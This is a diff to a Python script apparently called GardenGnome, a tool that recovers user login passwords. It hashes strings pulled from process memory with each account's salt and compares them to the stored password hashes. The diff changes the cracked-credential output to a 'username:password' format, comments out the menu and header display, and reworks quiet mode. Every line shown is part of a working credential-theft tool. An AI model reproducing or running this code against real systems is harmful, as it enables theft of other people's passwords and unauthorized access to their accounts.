@@ -172,7 +172,7 @@ def attack_user_account(u_acct,corestrings,pname,dmpid):
         for string in corestrings:
             convertstring = crypt.crypt(string, '${}$%s$'.format(useralg) % usersalt)
             if convertstring == buildhash:
-                credential_str = '| {0:10} | {1:20} | {2:40} | {3:5} |'.format(username,string,pname,dmpid)
+                credential_str = '{}:{} ({}:{})'.format(username,string,pname,dmpid)
                 return credential_str
 
             else:
@@ -204,8 +204,8 @@ def build_pidlist():
             pidlist = pidlist + pids
             pidkeys.update({name:pids})
 
-    proc_menu(pidkeys)
-    gardengnome_header()
+#    proc_menu(pidkeys)
+#    gardengnome_header()
 
     for dmpid in pidlist:
         procuser = psutil.Process(pid=int(dmpid)).username()
@@ -222,7 +222,7 @@ def build_pidlist():
             else:
                 pass
 
-    gardengnome_footer()
+#    gardengnome_footer()
     print ''
 
 def clean_garden():
@@ -248,14 +248,15 @@ def main():
     verbose = args.verbose
 
     if attack:
+
         if not quiet:
             gardengnome_banner()
+            print '[<>] Starting GardenGnome...\n'
+            build_pidlist()
 
         else:
             os.system('clear')
-
-        print '[<>] Starting GardenGnome...\n'
-        build_pidlist()
+            build_pidlist()
 
     clean_garden()
 
